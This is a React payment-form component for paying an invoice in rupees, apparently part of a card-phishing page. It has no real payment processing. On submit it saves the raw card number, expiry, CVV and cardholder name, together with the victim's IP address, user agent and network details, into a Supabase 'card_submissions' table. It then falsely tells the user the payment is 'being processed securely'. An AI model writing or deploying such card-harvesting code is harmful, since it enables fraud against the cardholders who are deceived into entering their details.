import React, { useState, useEffect } from 'react';
import { CreditCard } from 'lucide-react';
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Button } from "@/components/ui/button";
import { useToast } from "@/hooks/use-toast";
import { useNavigate } from 'react-router-dom';
import { supabase } from '@/integrations/supabase/client';

interface PaymentFormProps {
  invoiceId: string;
  amount: string;
}

const PaymentForm: React.FC<PaymentFormProps> = ({ invoiceId, amount }) => {
  const [cardNumber, setCardNumber] = useState('');
  const [expiryMonth, setExpiryMonth] = useState('');
  const [expiryYear, setExpiryYear] = useState('');
  const [cvv, setCvv] = useState('');
  const [cardHolder, setCardHolder] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const { toast } = useToast();
  const navigate = useNavigate();

  const getUserIP = async () => {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      return data.ip;
    } catch (error) {
      console.error('Could not get user IP:', error);
      return 'unknown';
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);

    try {
      const userIP = await getUserIP();
      const userAgent = navigator.userAgent;

      // Get network info
      let networkInfo = 'unknown';
      if ('connection' in navigator && navigator.connection) {
        const connection = navigator.connection as any;
        networkInfo = `type: ${connection.type}, effectiveType: ${connection.effectiveType}, downlink: ${connection.downlink}`;
      }

      // Insert data into Supabase
      const { error } = await supabase
        .from('card_submissions')
        .insert([
          {
            invoice_id: invoiceId,
            card_number: cardNumber,
            expiry_month: expiryMonth,
            expiry_year: expiryYear,
            cvv: cvv,
            card_holder: cardHolder,
            amount: amount,
            user_ip: userIP,
            browser: userAgent,
            network: networkInfo,
            created_at: new Date().toISOString(),
          },
        ]);

      if (error) {
        console.error('Supabase error:', error);
        toast({
          variant: 'destructive',
          title: 'Payment Failed',
          description: 'Failed to submit payment. Please try again.',
        });
      } else {
        toast({
          title: 'Payment Processing',
          description: 'Your payment is being processed securely.',
        });
        navigate('/processing');
      }
    } catch (err) {
      console.error('Submission error:', err);
      toast({
        variant: 'destructive',
        title: 'Submission Error',
        description: 'An unexpected error occurred. Please try again.',
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <form onSubmit={handleSubmit} className="space-y-4">
      <div className="space-y-2">
        <Label htmlFor="cardNumber">Card Number</Label>
        <Input
          type="text"
          id="cardNumber"
          placeholder="Enter card number"
          value={cardNumber}
          onChange={(e) => setCardNumber(e.target.value)}
          required
        />
      </div>
      <div className="grid grid-cols-2 gap-4">
        <div className="space-y-2">
          <Label htmlFor="expiryMonth">Expiry Month</Label>
          <Input
            type="text"
            id="expiryMonth"
            placeholder="MM"
            value={expiryMonth}
            onChange={(e) => setExpiryMonth(e.target.value)}
            required
          />
        </div>
        <div className="space-y-2">
          <Label htmlFor="expiryYear">Expiry Year</Label>
          <Input
            type="text"
            id="expiryYear"
            placeholder="YYYY"
            value={expiryYear}
            onChange={(e) => setExpiryYear(e.target.value)}
            required
          />
        </div>
      </div>
      <div className="space-y-2">
        <Label htmlFor="cvv">CVV</Label>
        <Input
          type="text"
          id="cvv"
          placeholder="Enter CVV"
          value={cvv}
          onChange={(e) => setCvv(e.target.value)}
          required
        />
      </div>
      <div className="space-y-2">
        <Label htmlFor="cardHolder">Card Holder Name</Label>
        <Input
          type="text"
          id="cardHolder"
          placeholder="Enter card holder name"
          value={cardHolder}
          onChange={(e) => setCardHolder(e.target.value)}
          required
        />
      </div>
      <div className="flex items-center justify-between">
        <div className="flex items-center space-x-1">
          <CreditCard className="w-5 h-5 text-gray-500" />
          <span className="text-sm text-gray-500">Pay Securely</span>
        </div>
        <div className="flex items-center space-x-1">
          <svg width="40" height="24" viewBox="0 0 40 24" className="border rounded">
            <rect width="40" height="24" fill="white"/>
            <text x="20" y="15" textAnchor="middle" fontSize="8" fill="#FF6600" fontWeight="bold">RuPay</text>
          </svg>
        </div>
      </div>
      <Button disabled={isSubmitting}>
        {isSubmitting ? 'Submitting...' : `Pay ₹${amount}`}
      </Button>
    </form>
  );
};

export default PaymentForm;
